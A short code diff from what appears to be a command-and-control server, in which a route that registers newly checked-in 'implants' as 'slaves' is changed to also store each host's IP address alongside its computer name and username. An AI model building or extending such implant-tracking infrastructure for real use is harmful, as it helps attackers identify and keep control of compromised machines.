@@ -14,6 +14,7 @@ router.post("/", implantMiddleware.checkInitRequest, (req, res) => {
 
         databaseHelper.addNewSlave({
             id: req.body.id,
+            ip: req.socket.remoteAddress,
             computername: req.body.computername,
             info: req.body.info,
             username: req.body.username
